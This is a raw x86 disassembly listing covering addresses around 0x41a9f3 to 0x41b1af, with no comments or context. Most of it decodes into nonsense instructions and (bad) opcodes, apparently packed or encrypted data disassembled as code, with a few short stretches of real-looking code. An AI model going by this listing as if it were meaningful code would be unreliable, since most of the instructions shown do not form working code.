  41a9f3:	mov    dh,0xee
  41a9f5:	mov    dh,0xe7
  41a9f7:	add    cl,cl
  41a9f9:	ins    BYTE PTR es:[edi],dx
  41a9fa:	std    
  41a9fb:	xchg   BYTE PTR [ebx+0x73],dh
  41a9fe:	jle    0x41aa44
  41aa00:	jle    0x41aa46
  41aa02:	mov    DWORD PTR [edi+0x5732f5c4],0x77fdbcc
  41aa0c:	popa   
  41aa0d:	and    dl,BYTE PTR ds:0xe08fb25d
  41aa13:	iret   
  41aa14:	mov    bh,0xe8
  41aa16:	sbb    esi,edx
  41aa18:	jp     0x41aa15
  41aa1a:	rcl    BYTE PTR [ebx+0x41],0xd1
  41aa1e:	or     eax,0x73bc75e6
  41aa23:	add    al,0xdb
  41aa25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa26:	xchg   ecx,eax
  41aa27:	cmp    BYTE PTR [esi-0x65],0xff
  41aa2b:	push   esi
  41aa2c:	jmp    0x5618:0x22c495eb
  41aa33:	sub    ecx,DWORD PTR [ebp+0x3c0bc209]
  41aa39:	bound  eax,QWORD PTR [esi]
  41aa3b:	xor    DWORD PTR [esi-0x415611da],ebx
  41aa41:	fwait
  41aa42:	push   ds
  41aa43:	dec    eax
  41aa44:	mov    dh,0xed
  41aa46:	mov    WORD PTR [ecx+0x9],ss
  41aa49:	xchg   edx,eax
  41aa4a:	push   esp
  41aa4b:	mov    BYTE PTR [ecx],al
  41aa4d:	rol    DWORD PTR [eax+0x6f],cl
  41aa50:	xor    BYTE PTR [ecx],bl
  41aa52:	mov    al,ds:0xcfa224ed
  41aa57:	xchg   ebp,eax
  41aa58:	adc    BYTE PTR [ebx-0x3c],dh
  41aa5b:	int    0x29
  41aa5d:	mov    bh,BYTE PTR [edx-0x2b]
  41aa60:	mov    ebp,0x1d1e32ab
  41aa65:	into   
  41aa66:	or     eax,0x9b9068e0
  41aa6b:	iret   
  41aa6c:	xchg   ebp,eax
  41aa6d:	xor    cl,BYTE PTR [eax+0x45]
  41aa70:	cmp    al,dl
  41aa72:	or     DWORD PTR [edi-0x4],0x8cfe0522
  41aa79:	inc    eax
  41aa7a:	and    DWORD PTR [edx+0x7d],eax
  41aa7d:	xor    bh,BYTE PTR [ebx-0x38a30846]
  41aa83:	shl    BYTE PTR [edi],0x62
  41aa86:	fst    DWORD PTR [ecx+0x3b]
  41aa89:	gs push 0x14e89084
  41aa8f:	test   DWORD PTR [ebp-0x1d78b78],ebp
  41aa95:	mov    bh,dl
  41aa97:	cmp    DWORD PTR [ebp-0x5685d68b],ebx
  41aa9d:	inc    esi
  41aa9e:	sahf   
  41aa9f:	mov    ebx,edi
  41aaa1:	scas   al,BYTE PTR es:[edi]
  41aaa2:	test   DWORD PTR [edi+edi*2],ebp
  41aaa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaa6:	test   BYTE PTR [eax-0x2f],ch
  41aaa9:	(bad)  
  41aaaa:	scas   al,BYTE PTR es:[edi]
  41aaab:	les    ebx,FWORD PTR [edi+0x6a]
  41aaae:	jmp    0x41aaaf
  41aab0:	pop    edx
  41aab1:	sub    DWORD PTR [edi+0x746ef277],eax
  41aab7:	xchg   esp,eax
  41aab8:	jge    0x41aa88
  41aaba:	cld    
  41aabb:	icebp  
  41aabc:	mov    dh,0x20
  41aabe:	pop    ecx
  41aabf:	test   BYTE PTR [esi-0x61],dh
  41aac2:	xchg   DWORD PTR [eax+0x36],esp
  41aac5:	dec    BYTE PTR [eax+eiz*8-0x4f551ffd]
  41aacc:	test   eax,0x7d182f50
  41aad1:	jne    0x41aaee
  41aad3:	shl    BYTE PTR [edx+eax*2-0x1fb49363],0xb4
  41aadb:	ror    DWORD PTR [ecx+ebx*1-0x6ba2a18c],cl
  41aae2:	lock repz jge 0x41ab52
  41aae6:	cmp    BYTE PTR [ebp+0x12651577],ah
  41aaec:	lods   al,BYTE PTR ds:[esi]
  41aaed:	mov    fs,WORD PTR [edx-0x7d]
  41aaf0:	clc    
  41aaf1:	pushf  
  41aaf2:	int3   
  41aaf3:	xlat   BYTE PTR ds:[ebx]
  41aaf4:	push   esp
  41aaf5:	pop    ds
  41aaf6:	jae    0x41aade
  41aaf8:	in     eax,dx
  41aaf9:	int3   
  41aafa:	xlat   BYTE PTR ds:[ebx]
  41aafb:	into   
  41aafc:	add    al,0xf9
  41aafe:	inc    edx
  41aaff:	inc    eax
  41ab00:	jmp    0x2704:0x80a159d2
  41ab07:	fwait
  41ab08:	jg     0x41ab2e
  41ab0a:	pop    esi
  41ab0b:	add    BYTE PTR [ebx],ch
  41ab0d:	ret    0x4531
  41ab10:	sbb    BYTE PTR [edx-0x49410a92],dl
  41ab16:	push   ebp
  41ab17:	add    dl,BYTE PTR [esi]
  41ab19:	mov    ds:0x4479eb28,eax
  41ab1e:	cmp    ebx,DWORD PTR [ebp+0x7b]
  41ab21:	lds    ecx,FWORD PTR [ecx+0x68dbaa6b]
  41ab27:	jae    0x41ab0e
  41ab29:	xchg   edx,eax
  41ab2a:	pop    ecx
  41ab2b:	ins    BYTE PTR es:[edi],dx
  41ab2c:	outs   dx,BYTE PTR ds:[esi]
  41ab2d:	lock sub esi,0x7d
  41ab31:	sub    al,BYTE PTR [ecx-0x369ca3b]
  41ab37:	imul   DWORD PTR [ecx]
  41ab39:	add    BYTE PTR [ecx-0x27],bl
  41ab3c:	add    BYTE PTR [esi-0x323b4f42],0xa4
  41ab43:	into   
  41ab44:	push   eax
  41ab45:	mov    dh,0x44
  41ab47:	sti    
  41ab48:	cmp    ebp,esp
  41ab4a:	rcl    DWORD PTR [ecx],cl
  41ab4c:	hlt    
  41ab4d:	pusha  
  41ab4e:	popa   
  41ab4f:	xor    bh,BYTE PTR ds:[ecx+0x43]
  41ab53:	inc    ecx
  41ab54:	add    al,0xe4
  41ab56:	and    eax,0xfa65a3f7
  41ab5b:	push   es
  41ab5c:	out    dx,al
  41ab5d:	push   0xffffffdd
  41ab5f:	mov    edx,0xcf5898e2
  41ab64:	xchg   BYTE PTR [eax+0x44],ah
  41ab67:	xor    edx,edi
  41ab69:	xchg   ebx,eax
  41ab6a:	push   eax
  41ab6b:	xchg   esi,eax
  41ab6c:	test   al,0xab
  41ab6e:	hlt    
  41ab6f:	gs push edx
  41ab71:	popf   
  41ab72:	sbb    bl,BYTE PTR [ecx-0x58]
  41ab75:	and    eax,0x53326b5b
  41ab7a:	repz sar DWORD PTR [edi-0x4f968ea4],cl
  41ab81:	push   0xffffff92
  41ab83:	xor    DWORD PTR [eax],0xffffffe7
  41ab86:	pop    es
  41ab87:	mov    ebp,0x35934917
  41ab8c:	inc    ecx
  41ab8d:	pop    eax
  41ab8e:	and    edi,DWORD PTR [edi]
  41ab90:	test   ah,bh
  41ab92:	xchg   esp,eax
  41ab93:	jl     0x41ab80
  41ab95:	test   cl,0xcc
  41ab98:	push   es
  41ab99:	nop
  41ab9a:	jae    0x41ab75
  41ab9c:	retf   
  41ab9d:	add    al,0x40
  41ab9f:	sti    
  41aba0:	imul   ecx,DWORD PTR [esi-0x76],0x50
  41aba4:	sub    edx,esp
  41aba6:	sbb    DWORD PTR [eax],ebp
  41aba8:	cmp    BYTE PTR [edi-0x15ce45e6],al
  41abae:	sbb    eax,0xa63f315
  41abb3:	jmp    ebp
  41abb5:	push   es
  41abb6:	xor    DWORD PTR [eax-0x409fc12a],ebp
  41abbc:	dec    esi
  41abbd:	dec    esp
  41abbe:	into   
  41abbf:	gs inc ecx
  41abc1:	dec    ebx
  41abc2:	call   0xe31e:0x66bc49a
  41abc9:	outs   dx,BYTE PTR ds:[esi]
  41abca:	dec    esp
  41abcb:	ror    BYTE PTR ds:0xf7842eda,0x9b
  41abd2:	outs   dx,DWORD PTR ds:[esi]
  41abd3:	xchg   DWORD PTR [ebx],edx
  41abd5:	lock mov edx,0x7ac36e49
  41abdb:	xchg   esi,eax
  41abdc:	push   edi
  41abdd:	imul   eax,DWORD PTR [esp+esi*1+0x2d],0x9052b37d
  41abe5:	gs mov ebx,0xf5d8f3fa
  41abeb:	(bad)  
  41abec:	pop    esp
  41abed:	repz pop eax
  41abef:	sar    dh,cl
  41abf1:	mov    al,ds:0x4808ce2e
  41abf6:	es jge 0x41abf5
  41abf9:	fcmovne st,st(4)
  41abfb:	out    0x99,al
  41abfd:	add    al,BYTE PTR ds:0x49b0ef1
  41ac03:	fwait
  41ac04:	push   edi
  41ac05:	gs dec edx
  41ac07:	aad    0x96
  41ac09:	inc    ebp
  41ac0a:	popa   
  41ac0b:	ret    
  41ac0c:	loopne 0x41ac5f
  41ac0e:	cmc    
  41ac0f:	sbb    DWORD PTR [ebp+0x4e],esi
  41ac12:	xchg   esp,eax
  41ac13:	add    DWORD PTR [eax-0x15],esi
  41ac16:	repnz inc edx
  41ac18:	into   
  41ac19:	inc    edx
  41ac1a:	inc    ebp
  41ac1b:	loopne 0x41aba8
  41ac1d:	arpl   WORD PTR [esi+ecx*4-0x26],si
  41ac21:	xor    DWORD PTR [ebp+0xe],0xca0f5370
  41ac28:	push   esi
  41ac29:	rcl    BYTE PTR [ebx],1
  41ac2b:	xchg   ecx,eax
  41ac2c:	mov    eax,ds:0xaebe98e0
  41ac31:	add    DWORD PTR [eax-0x12],0xffffffd6
  41ac35:	call   FWORD PTR [esi+0x693ec3e5]
  41ac3b:	and    bl,BYTE PTR [edi-0x5cd112b3]
  41ac41:	xchg   ebx,eax
  41ac42:	jae    0x41acb3
  41ac44:	mov    bl,0x29
  41ac46:	push   edi
  41ac47:	mov    BYTE PTR [ecx],ah
  41ac49:	aad    0x5f
  41ac4b:	imul   ecx,DWORD PTR ds:[ecx],0xffffffa5
  41ac4f:	mov    ch,0x96
  41ac51:	int3   
  41ac52:	ret    
  41ac53:	adc    al,0x90
  41ac55:	shl    BYTE PTR [eax],cl
  41ac57:	cmp    DWORD PTR ds:0x1ef69c2b,0x82c8b83a
  41ac61:	pushw  0x9cd5
  41ac65:	ja     0x41ac28
  41ac67:	clc    
  41ac68:	inc    ecx
  41ac69:	sbb    esp,DWORD PTR [ebp-0x10d3a4ff]
  41ac6f:	push   ss
  41ac70:	in     al,dx
  41ac71:	xchg   ebp,eax
  41ac72:	bnd jne 0x41ac9b
  41ac75:	stos   DWORD PTR es:[edi],eax
  41ac76:	sbb    ecx,DWORD PTR [eax+0x44]
  41ac79:	pop    eax
  41ac7a:	(bad)  
  41ac7b:	jmp    0x6a87:0xe756b3f4
  41ac82:	jne    0x41ace4
  41ac84:	xor    eax,esi
  41ac86:	sub    bl,BYTE PTR [ecx-0x1331470e]
  41ac8c:	sbb    edi,DWORD PTR [ebx]
  41ac8e:	enter  0x3bba,0xba
  41ac92:	jmp    DWORD PTR [ecx]
  41ac94:	add    BYTE PTR [eax],al
  41ac96:	add    DWORD PTR ds:0x422942,0x42b3
  41aca0:	sub    edx,eax
  41aca2:	mov    eax,ds:0x4228ea
  41aca7:	push   esi
  41aca8:	mov    eax,0xb49
  41acad:	sbb    eax,ecx
  41acaf:	cmp    DWORD PTR ds:0x422916,0x0
  41acb6:	mov    DWORD PTR ds:0x4229d2,ebx
  41acbc:	mov    DWORD PTR ds:0x42293a,ecx
  41acc2:	mov    DWORD PTR ds:0x422942,ecx
  41acc8:	jmp    0x41ad23
  41accd:	not    DWORD PTR ds:0x4228ce
  41acd3:	jge    0x41acf8
  41acd9:	push   0x7637
  41acde:	call   DWORD PTR ds:0x42a02c
  41ace4:	adc    ecx,DWORD PTR ds:0x42295a
  41acea:	xor    esi,esi
  41acec:	xor    esi,DWORD PTR ds:0x4228ea
  41acf2:	and    DWORD PTR ds:0x422952,esi
  41acf8:	sbb    DWORD PTR ds:0x422986,ebx
  41acfe:	mov    esi,DWORD PTR ds:0x422a9a
  41ad04:	mov    ecx,DWORD PTR ds:0x422afa
  41ad0a:	sub    ecx,esi
  41ad0c:	add    esi,DWORD PTR [esi+ecx*1]
  41ad0f:	xor    ecx,ecx
  41ad11:	xor    ecx,DWORD PTR ds:0x4228ae
  41ad17:	or     DWORD PTR ds:0x422896,ecx
  41ad1d:	sbb    ecx,DWORD PTR ds:0x422976
  41ad23:	mov    ecx,DWORD PTR [ebp-0x20]
  41ad26:	mov    esi,DWORD PTR [ebp-0x1c]
  41ad29:	jmp    0x41b172
  41ad2e:	test   BYTE PTR [eax+ecx*2+0x7c],ah
  41ad32:	sub    BYTE PTR [eax],ah
  41ad34:	cmp    BYTE PTR [ebp+eax*1-0x4e],dl
  41ad38:	cmc    
  41ad39:	push   0x6e9cdec0
  41ad3e:	int    0x1d
  41ad40:	or     al,0x16
  41ad42:	(bad)  
  41ad43:	push   cs
  41ad44:	push   ss
  41ad45:	push   ss
  41ad46:	stos   DWORD PTR es:[edi],eax
  41ad47:	ds push ss
  41ad49:	sub    al,0x81
  41ad4b:	adc    DWORD PTR [ebx],ecx
  41ad4d:	push   eax
  41ad4e:	arpl   WORD PTR [esi+eax*1],si
  41ad51:	in     eax,0xfd
  41ad53:	sub    esp,esp
  41ad55:	adc    al,0xac
  41ad57:	ins    DWORD PTR es:[edi],dx
  41ad58:	xchg   esp,eax
  41ad59:	push   ebx
  41ad5a:	lds    edx,FWORD PTR [edi+0x1b]
  41ad5d:	pop    ebp
  41ad5e:	or     dl,BYTE PTR [ecx+eax*1+0x58]
  41ad62:	fs arpl bp,bp
  41ad65:	(bad)  
  41ad66:	sub    eax,0xb82fafff
  41ad6b:	ret    0xdb67
  41ad6e:	xor    BYTE PTR [eax+0x7c],ah
  41ad71:	(bad)  
  41ad72:	mov    edx,0xf4f36b6e
  41ad77:	ss cld 
  41ad79:	jno    0x41ade2
  41ad7b:	cld    
  41ad7c:	xor    edx,DWORD PTR [ebp+ebp*1-0x4f]
  41ad80:	ja     0x41ad3e
  41ad82:	cmp    bl,dl
  41ad84:	inc    esi
  41ad85:	mov    bh,0x9f
  41ad87:	push   0xffffffd3
  41ad89:	addr16 pop eax
  41ad8b:	push   edx
  41ad8c:	rol    DWORD PTR [esi+0x5881ae69],cl
  41ad92:	dec    ebp
  41ad93:	dec    ebx
  41ad94:	xor    DWORD PTR [esi-0x31d0bab6],esp
  41ad9a:	and    bh,ah
  41ad9c:	ret    0xf239
  41ad9f:	add    eax,0xd57e1975
  41ada4:	xlat   BYTE PTR ds:[ebx]
  41ada5:	std    
  41ada6:	out    0x15,eax
  41ada8:	in     al,0x4e
  41adaa:	push   ebx
  41adab:	pop    esp
  41adac:	jae    0x41ae04
  41adae:	div    DWORD PTR [eax+0x78]
  41adb1:	push   edx
  41adb2:	pop    ebp
  41adb3:	aaa    
  41adb4:	mov    ebx,0xe78598e
  41adb9:	lock fadd DWORD PTR [ebp-0x7691246f]
  41adc0:	out    dx,eax
  41adc1:	add    eax,0x30f94460
  41adc6:	push   ds
  41adc7:	mov    dh,bh
  41adc9:	xchg   ebx,eax
  41adca:	jmp    0x41adf5
  41adcc:	xor    BYTE PTR [ebp+edi*2+0x6a5b8ac2],0x28
  41add4:	mov    ebx,0x6b187173
  41add9:	and    BYTE PTR [edx+0x9],al
  41addc:	jge    0x41ad71
  41adde:	or     ch,BYTE PTR [esi+0x32]
  41ade1:	or     ax,WORD PTR [ebx]
  41ade4:	jne    0x41ae63
  41ade6:	arpl   WORD PTR [esi+0x3a],bx
  41ade9:	inc    edi
  41adea:	cdq    
  41adeb:	push   es
  41adec:	pop    ds
  41aded:	mov    edi,0xa9e0196b
  41adf2:	jae    0x41ad7e
  41adf4:	call   0xf116e065
  41adf9:	xchg   ebx,eax
  41adfa:	sub    esi,ebp
  41adfc:	dec    edx
  41adfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adfe:	push   0x1e
  41ae00:	pextrw eax,(bad),0xc5
  41ae02:	xchg   BYTE PTR [edi-0x912626],dl
  41ae08:	pusha  
  41ae09:	adc    eax,DWORD PTR [ebp-0xe508ad9]
  41ae0f:	jmp    0xfaf89498
  41ae14:	aas    
  41ae15:	dec    esp
  41ae16:	inc    esp
  41ae17:	sub    DWORD PTR [ebx],edx
  41ae19:	es jbe 0x41adc8
  41ae1c:	xchg   edi,eax
  41ae1d:	js     0x41ae1d
  41ae1f:	popf   
  41ae20:	xchg   edi,eax
  41ae21:	fst    QWORD PTR ds:0xa2090a2c
  41ae27:	popa   
  41ae28:	iret   
  41ae29:	add    esi,edi
  41ae2b:	mov    ecx,0xeec2c1e
  41ae30:	push   ebp
  41ae31:	add    BYTE PTR ds:0x781e4c69,al
  41ae37:	dec    ebx
  41ae38:	ss jp  0x41ae8b
  41ae3b:	scas   al,BYTE PTR es:[edi]
  41ae3c:	sbb    BYTE PTR [eax-0x28ed21f8],0xc6
  41ae43:	inc    edi
  41ae44:	mov    al,ds:0x9ef013f0
  41ae49:	pop    edx
  41ae4a:	push   cs
  41ae4b:	fwait
  41ae4c:	loop   0x41ae0b
  41ae4e:	imul   ecx,DWORD PTR fs:[ebx+0x36],0x4c544cee
  41ae56:	(bad)  
  41ae58:	and    bh,BYTE PTR [ebp-0x4e29a12c]
  41ae5e:	shl    esi,1
  41ae60:	pop    esi
  41ae61:	mov    al,0x97
  41ae63:	outs   dx,BYTE PTR ds:[esi]
  41ae64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae65:	les    esp,FWORD PTR [ecx-0x7e]
  41ae68:	push   ss
  41ae69:	jp     0x41ae65
  41ae6b:	add    eax,0x90b0a08
  41ae70:	sahf   
  41ae71:	pop    ecx
  41ae72:	jnp    0x41ae11
  41ae74:	cmp    al,0x70
  41ae76:	mov    ebp,0xc9d8c108
  41ae7b:	cli    
  41ae7c:	cmp    BYTE PTR [eax-0x2a773f89],ah
  41ae82:	add    ecx,ebp
  41ae84:	adc    esp,DWORD PTR [ebx+0x74]
  41ae87:	int3   
  41ae88:	imul   edx,DWORD PTR [esi-0x21],0x25da9041
  41ae8f:	or     DWORD PTR [ebp+ebx*1+0x3c],edx
  41ae93:	popa   
  41ae94:	mov    cs,WORD PTR [ecx+0x5b]
  41ae97:	mov    esi,0x49df9c10
  41ae9c:	addr16 in eax,dx
  41ae9e:	mov    eax,ds:0xee7cde17
  41aea3:	mov    bl,0xd6
  41aea5:	xchg   ebx,eax
  41aea6:	push   esi
  41aea7:	adc    BYTE PTR [eax-0x1d480771],0x9d
  41aeae:	fidivr DWORD PTR [ebx-0x6d9c66a]
  41aeb4:	into   
  41aeb5:	scas   al,BYTE PTR es:[edi]
  41aeb6:	mov    dh,0xa7
  41aeb8:	out    0x43,al
  41aeba:	xchg   ecx,eax
  41aebb:	hlt    
  41aebc:	in     eax,0x47
  41aebe:	xchg   ecx,eax
  41aebf:	inc    esi
  41aec0:	call   0x958ddf4d
  41aec5:	jnp    0x41ae9e
  41aec7:	mov    al,BYTE PTR [eax-0x21f1afef]
  41aecd:	xor    BYTE PTR [edi+0x3a],dl
  41aed0:	sbb    ebx,ebp
  41aed2:	das    
  41aed3:	jae    0x41ae72
  41aed5:	lock sbb DWORD PTR gs:[edi-0x5f],ecx
  41aeda:	xchg   edi,eax
  41aedb:	(bad)  
  41aedc:	hlt    
  41aedd:	(bad)  
  41aede:	cmp    al,0x18
  41aee0:	nop
  41aee1:	cmovo  edx,DWORD PTR [edx+0x3e]
  41aee5:	out    0xbe,al
  41aee7:	xlat   BYTE PTR es:[ebx]
  41aee9:	and    esp,DWORD PTR [eax*4+0x169646a3]
  41aef0:	out    0x31,eax
  41aef2:	stc    
  41aef3:	shl    ebp,1
  41aef5:	fnstsw WORD PTR [ebx-0x4ee88e0b]
  41aefb:	add    ch,BYTE PTR [edi-0x7e]
  41aefe:	dec    ebx
  41aeff:	nop
  41af00:	sbb    DWORD PTR [edi+0x1d5ae46b],ebp
  41af06:	push   0x8b2d8e11
  41af0b:	outs   dx,BYTE PTR ds:[esi]
  41af0c:	add    al,0xf
  41af0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af0f:	pushf  
  41af10:	dec    eax
  41af11:	or     ch,BYTE PTR [ebp-0x31056ef3]
  41af17:	cmp    ch,BYTE PTR [ebx+eax*4+0x149f5f75]
  41af1e:	and    al,0x9e
  41af20:	and    eax,0xbae6ec5a
  41af25:	xchg   esi,eax
  41af26:	inc    edx
  41af27:	or     ebp,DWORD PTR [esi-0x49acfeb5]
  41af2d:	jb     0x41af87
  41af2f:	adc    edx,DWORD PTR [ebx+edi*8-0x7d5091de]
  41af36:	inc    edi
  41af37:	imul   ebx
  41af39:	je     0x41afb5
  41af3b:	jns    0x41af64
  41af3d:	cmp    eax,0x1cb08755
  41af42:	sbb    BYTE PTR [eax+edx*1+0x7786afea],0x28
  41af4a:	jmp    0x41af86
  41af4c:	jns    0x41afc9
  41af4e:	mulps  xmm5,XMMWORD PTR [esi-0x6d]
  41af52:	push   ebp
  41af53:	es aam 0x79
  41af56:	xor    eax,0x3d5c5697
  41af5b:	cmp    bh,ch
  41af5d:	pushf  
  41af5e:	mov    eax,0xa21fd2ab
  41af63:	cdq    
  41af64:	pop    edx
  41af65:	and    al,0xb0
  41af67:	bound  ebx,QWORD PTR [ebx]
  41af69:	add    al,0x40
  41af6b:	adc    BYTE PTR [ebx+0x19],0x2f
  41af6f:	xor    dh,BYTE PTR [ebp-0x73]
  41af72:	mov    bl,0x5f
  41af74:	jb     0x41af4a
  41af76:	jno    0x41af62
  41af78:	out    dx,eax
  41af79:	loopne 0x41af15
  41af7b:	scas   al,BYTE PTR es:[edi]
  41af7c:	jns    0x41afec
  41af7e:	sar    DWORD PTR [eax+0x49],1
  41af81:	adc    esp,DWORD PTR [edx]
  41af83:	add    ebx,DWORD PTR [edi+0x58640d90]
  41af89:	jae    0x41af3e
  41af8b:	lahf   
  41af8c:	push   0xfdde2d51
  41af91:	mov    WORD PTR [edi],fs
  41af93:	jno    0x41af85
  41af95:	dec    edi
  41af96:	inc    edx
  41af97:	lods   eax,DWORD PTR ds:[esi]
  41af98:	iret   
  41af99:	imul   ecx,DWORD PTR [edx],0x3d
  41af9c:	mov    ch,0x43
  41af9e:	lock add DWORD PTR [edx+0x3264aa48],edi
  41afa5:	adc    DWORD PTR [ebp+0x52],esi
  41afa8:	clc    
  41afa9:	(bad)  
  41afaa:	fcmovnbe st,st(1)
  41afac:	xchg   DWORD PTR [esi],edx
  41afae:	dec    ecx
  41afaf:	jl     0x41b02b
  41afb1:	aas    
  41afb2:	clc    
  41afb3:	(bad)  
  41afb4:	aas    
  41afb5:	fcomp  DWORD PTR [ecx+0xf]
  41afb8:	cmp    BYTE PTR [ebp-0x5c],dh
  41afbb:	pop    ss
  41afbc:	xchg   esp,eax
  41afbd:	dec    esi
  41afbe:	cld    
  41afbf:	mov    bl,0xc7
  41afc1:	pushf  
  41afc2:	loopne 0x41afe0
  41afc4:	stc    
  41afc5:	aam    0x4
  41afc7:	jl     0x41afb4
  41afc9:	or     DWORD PTR [ecx],esi
  41afcb:	arpl   WORD PTR [esp],di
  41afce:	lahf   
  41afcf:	sbb    DWORD PTR [edi-0x17],ebx
  41afd2:	sbb    ebp,ebx
  41afd4:	aad    0x24
  41afd6:	xlat   BYTE PTR ds:[ebx]
  41afd7:	int    0xfc
  41afd9:	or     eax,0xbc524255
  41afde:	ret    0xb9ab
  41afe1:	xor    al,0x5e
  41afe3:	into   
  41afe4:	dec    edx
  41afe5:	xor    esi,DWORD PTR [esi-0x3cdf9d83]
  41afeb:	mul    DWORD PTR [eax]
  41afed:	jge    0x41afad
  41afef:	mov    al,0x51
  41aff1:	test   BYTE PTR [eax-0x32],0xb3
  41aff5:	xor    eax,0xea6d7f5a
  41affa:	xchg   ebp,eax
  41affb:	and    al,0xb0
  41affd:	leave  
  41affe:	lock gs xor eax,0xf6e4811d
  41b005:	fld    QWORD PTR [edi]
  41b007:	jp     0x41afe3
  41b009:	test   eax,0xfecb8284
  41b00e:	popa   
  41b00f:	jbe    0x41afd2
  41b011:	jge    0x41afdd
  41b013:	jp     0x41b064
  41b015:	xchg   ebp,eax
  41b016:	test   BYTE PTR [ebp-0xe611ba1],bl
  41b01c:	scas   eax,DWORD PTR es:[edi]
  41b01d:	retf   
  41b01e:	pusha  
  41b01f:	lahf   
  41b020:	call   0xee47:0x2df49ac2
  41b027:	sub    eax,0x25b61dd5
  41b02c:	jne    0x41b04d
  41b02e:	dec    ebp
  41b02f:	dec    ebx
  41b030:	(bad)  [eax-0x36abf2f0]
  41b036:	adc    eax,0x19825549
  41b03b:	mov    esp,0xffc83f6
  41b040:	aaa    
  41b041:	call   0x1d812432
  41b046:	cli    
  41b047:	push   0x6
  41b049:	mov    ?,ebx
  41b04b:	xor    ah,0x66
  41b04e:	jbe    0x41b0ad
  41b050:	(bad)  
  41b051:	(bad)  
  41b053:	mul    BYTE PTR [ebp-0x2b]
  41b056:	(bad)
  41b059:	stos   DWORD PTR es:[edi],eax
  41b05a:	cmc    
  41b05b:	or     al,0x8b
  41b05d:	rcr    BYTE PTR [ebx+0x702b4ec6],0x5f
  41b064:	iret   
  41b065:	add    al,0x9a
  41b067:	push   ecx
  41b068:	sbb    al,0xbf
  41b06a:	loop   0x41b0d6
  41b06c:	inc    edi
  41b06d:	mov    ch,BYTE PTR [edi-0x61795c05]
  41b073:	push   cs
  41b074:	jl     0x41b0c7
  41b076:	mov    esi,0x2e28c0c0
  41b07b:	xchg   ebp,eax
  41b07c:	jo     0x41b070
  41b07e:	ds cmp eax,0x71de25a5
  41b084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b085:	mov    eax,ds:0xd81b8882
  41b08a:	mov    ebp,DWORD PTR [ecx+0x25065875]
  41b090:	sub    BYTE PTR [edx+esi*4+0x1e],ch
  41b094:	push   cs
  41b095:	mov    edx,0x20987575
  41b09a:	push   esi
  41b09b:	xchg   edi,eax
  41b09c:	inc    esi
  41b09d:	mov    dh,0xa0
  41b09f:	or     eax,0xe4fb8e01
  41b0a4:	cmp    BYTE PTR [edi+ecx*2+0x6b],0x7b
  41b0a9:	fnstsw WORD PTR [edi+0x733d17d7]
  41b0af:	push   0x36ab0330
  41b0b4:	xor    eax,0xcb6a564a
  41b0b9:	aam    0xff
  41b0bb:	jmp    0x41b0b6
  41b0bd:	(bad)  [edi]
  41b0bf:	adc    al,0x38
  41b0c2:	or     eax,0x38ce779a
  41b0c7:	sub    al,0x7c
  41b0c9:	test   DWORD PTR [ebx*2+0x7235adf2],eax
  41b0d0:	data16 lods al,BYTE PTR ds:[esi]
  41b0d2:	cmp    edx,DWORD PTR [ebx+0x5b]
  41b0d5:	cs rcr bl,0x8d
  41b0d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0da:	retf   0xa674
  41b0dd:	pop    ds
  41b0de:	inc    esp
  41b0df:	adc    eax,0x5a6e7067
  41b0e4:	mov    ah,0x99
  41b0e6:	(bad)  
  41b0e7:	sbb    DWORD PTR [esi],esp
  41b0e9:	dec    esi
  41b0ea:	jecxz  0x41b085
  41b0ec:	mov    al,ds:0x465f1e57
  41b0f1:	pop    ds
  41b0f2:	and    ebp,DWORD PTR fs:[ebp+0x6edb7a8]
  41b0f9:	adc    al,0xe7
  41b0fb:	in     eax,0x4c
  41b0fd:	push   ebx
  41b0fe:	retf   
  41b0ff:	pop    edi
  41b100:	cld    
  41b101:	jb     0x41b148
  41b103:	aam    0x4c
  41b105:	test   al,0xcb
  41b107:	push   edi
  41b108:	jne    0x41b0c0
  41b10a:	sbb    esi,eax
  41b10c:	or     ecx,DWORD PTR [ebp-0x34]
  41b10f:	icebp  
  41b110:	(bad)  
  41b111:	fmul   DWORD PTR [ebx+0x53]
  41b114:	je     0x41b10e
  41b116:	xchg   edx,eax
  41b117:	jmp    0xac57:0x57d939e7
  41b11e:	stos   DWORD PTR es:[edi],eax
  41b11f:	and    dl,BYTE PTR [edi+edi*8]
  41b122:	jmp    0x4aa8:0x230d88b1
  41b129:	ficomp WORD PTR [ecx+0x79]
  41b12c:	mov    ebx,DWORD PTR [ecx+ecx*8+0x3c]
  41b130:	push   edi
  41b131:	ins    DWORD PTR es:[edi],dx
  41b132:	dec    edi
  41b133:	lock and eax,0x3f55d17
  41b139:	push   cs
  41b13a:	cmp    DWORD PTR [edx+0x4d],edx
  41b13d:	fs ins DWORD PTR es:[edi],dx
  41b13f:	fisttp QWORD PTR [ecx-0x4db0de01]
  41b145:	pop    es
  41b146:	mov    DWORD PTR [edi],ecx
  41b148:	pmuludq mm5,mm2
  41b14b:	mov    ah,BYTE PTR [edx]
  41b14d:	enter  0xf88f,0xe0
  41b151:	add    DWORD PTR [ebx+ebx*2+0x7095364a],ebp
  41b158:	call   0x1e33:0x1fb9a5f5
  41b15f:	push   eax
  41b160:	mov    ds:0xb618bfa1,eax
  41b165:	mov    BYTE PTR [ebp+0x4b],ch
  41b168:	call   0x1157:0xda2b820f
  41b16f:	ja     0x41b0ff
  41b171:	rcl    BYTE PTR [esi+0x51],cl
  41b174:	sub    DWORD PTR ds:0x4229c6,0x422892
  41b17e:	push   eax
  41b17f:	xor    DWORD PTR ds:0x4228e6,0x42296a
  41b189:	push   edx
  41b18a:	jmp    0x41b5d3
  41b18f:	xor    DWORD PTR [esi],ecx
  41b191:	inc    esi
  41b192:	or     ebx,DWORD PTR [eax]
  41b194:	xor    ah,BYTE PTR [ecx]
  41b196:	and    al,0xeb
  41b198:	fwait
  41b199:	ds push 0x6834743b
  41b19f:	jge    0x41b1b6
  41b1a1:	or     al,0x16
  41b1a3:	(bad)  
  41b1a4:	push   cs
  41b1a5:	push   ss
  41b1a6:	push   ss
  41b1a7:	mov    ds:0x91e6dc0,eax
  41b1ac:	(bad)  
  41b1ad:	pop    ds
  41b1ae:	stos   DWORD PTR es:[edi],eax
  41b1af:	xor    eax,0x5fe3b1e6
